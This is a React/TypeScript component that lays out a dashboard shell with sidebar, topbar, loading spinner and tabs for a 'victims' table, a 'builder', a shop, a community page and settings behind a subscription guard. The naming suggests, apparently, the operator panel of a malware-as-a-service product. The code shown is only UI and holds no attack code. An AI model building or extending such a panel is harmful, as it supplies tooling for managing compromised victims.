"use client";

import { useEffect, useRef, useState } from "react";

import { PanelDetailViewProvider, usePanelDetailView } from "../panel/detail/panel-detail-view-provider";
import { useVictimsTablePrefs, VictimsTablePrefsProvider } from "../panel/victims-table/victims-table-prefs-provider";
import { PanelSettingsProvider } from "../settings";
import { installToastGlobal } from "../toast";
import type { VictimsFilter } from "../state/victims-filter";
import { PanelWsProvider } from "../ws/ws-provider";
import { PanelSidebar } from "./panel-sidebar";
import { PanelTopbar } from "./panel-topbar";
import { PanelDynamicScreens } from "./panel-dynamic-screens";
import { PanelErrorBoundary } from "./panel-error-boundary";
import { usePanelSubscriptionGuard } from "./use-panel-subscription-guard";
import { usePanelLoader } from "./use-panel-loader";
import { useSessionRefresh } from "../hooks/use-session-refresh";

export function PanelShell() {
   return (
      <PanelErrorBoundary>
         <PanelWsProvider>
            <PanelDetailViewProvider>
               <VictimsTablePrefsProvider>
                  <PanelShellInner />
               </VictimsTablePrefsProvider>
            </PanelDetailViewProvider>
         </PanelWsProvider>
      </PanelErrorBoundary>
   );
}

function PanelShellInner() {
   const { displayTab, guardedSetTab, settingsTab, setSettingsTab, isPendingRestrictedTab, tab } = usePanelSubscriptionGuard();
   const detail = usePanelDetailView();
   const victimsPrefs = useVictimsTablePrefs();
   const [victimsFilter, setVictimsFilter] = useState<VictimsFilter>("all");
   const contentRef = useRef<HTMLElement | null>(null);
   const { shouldShowLoader, loaderFadingOut } = usePanelLoader(isPendingRestrictedTab);
   useSessionRefresh();

   useEffect(() => {
      if (isPendingRestrictedTab) return;
      try {
         document.body.classList.add("isPanelShell");
      } catch {
      }
      return () => {
         try {
            document.body.classList.remove("isPanelShell");
         } catch {
         }
      };
   }, [isPendingRestrictedTab]);

   useEffect(() => {
      if (isPendingRestrictedTab) return;
      try {
         document.body.classList.toggle("isPanelTab", displayTab === "panel");
         document.body.classList.toggle("isBuilderTab", displayTab === "builder");
         document.body.classList.toggle("isShopTab", displayTab === "shop");
         document.body.classList.toggle("isCommunityTab", displayTab === "community");
         document.body.classList.toggle("isSettingsTab", displayTab === "settings");
      } catch {
      }
   }, [displayTab, isPendingRestrictedTab]);

   useEffect(() => {
      installToastGlobal();
   }, []);

   useEffect(() => {
      void import("../screens/builder-screen");
      void import("../screens/shop-screen");
      void import("../screens/community-screen");
      void import("../screens/settings-screen");
   }, []);

   useEffect(() => {
      if (isPendingRestrictedTab) return;
      if (tab !== "panel" && detail.isOpen) {
         detail.closeDetailView();
      }
   }, [detail, isPendingRestrictedTab, tab]);

   useEffect(() => {
      if (isPendingRestrictedTab) return;
      if (tab !== "panel" && victimsPrefs.isFilterModalOpen) {
         victimsPrefs.closeFilterModal();
      }
   }, [isPendingRestrictedTab, tab, victimsPrefs]);

   useEffect(() => {
      if (isPendingRestrictedTab) return;
      if (detail.isOpen && victimsPrefs.isFilterModalOpen) {
         victimsPrefs.closeFilterModal();
      }
   }, [detail.isOpen, isPendingRestrictedTab, victimsPrefs]);

   if (shouldShowLoader || loaderFadingOut) {
      return (
         <div
            className={
               "grid h-[100dvh] overflow-hidden place-items-center transition-opacity duration-[600ms] " +
               (shouldShowLoader && !loaderFadingOut ? "opacity-100" : "opacity-0")
            }
            style={{ background: "var(--wc-panel-bg)" }}
         >
            <div className="grid place-items-center gap-[16px]">
               <div className="relative grid h-[64px] w-[64px] place-items-center">
                  <div className="absolute inset-0 rounded-full border-[2px] border-[rgba(255,255,255,0.06)]" />
                  <div className="absolute inset-0 rounded-full border-[2px] border-transparent border-t-[rgba(255,255,255,0.35)] animate-spin" />
                  <img
                     src="/logo/main_logo.ico"
                     alt=""
                     draggable={false}
                     className="h-[28px] w-[28px] rounded-[6px] opacity-60"
                     style={{ animation: "pulse 2s cubic-bezier(0.4,0,0.6,1) infinite" }}
                  />
               </div>
               <span className="text-[11px] font-bold uppercase tracking-[1.6px] text-[rgba(255,255,255,0.25)]">Loading</span>
            </div>
         </div>
      );
   }

   return (
      <PanelSettingsProvider contentRef={contentRef}>
         <div className="h-[100dvh] overflow-hidden text-white/90" style={{ background: "var(--wc-panel-bg)" }}>
            <div className={detail.isOpen ? "grid h-[100dvh] grid-cols-[64px_1fr]" : "grid h-[100dvh] grid-cols-[46px_1fr]"}>
               <PanelSidebar tab={displayTab} setTab={guardedSetTab} />

               <main
                  className="grid min-w-0 grid-rows-[auto_1fr] bg-transparent relative shadow-[inset_0_3px_0_var(--line),inset_0_-3px_0_var(--line)]"
                  aria-label="Main"
               >
                  <PanelTopbar
                     tab={displayTab}
                     filter={victimsFilter}
                     onFilterChange={setVictimsFilter}
                     settingsTab={settingsTab}
                     onSettingsTabChange={setSettingsTab}
                  />

                  <section ref={contentRef} className="content relative min-h-0 flex-1 overflow-x-visible overflow-y-hidden">
                     <PanelDynamicScreens displayTab={displayTab} filter={victimsFilter} settingsTab={settingsTab} />
                  </section>
               </main>
            </div>
         </div>
      </PanelSettingsProvider>
   );
}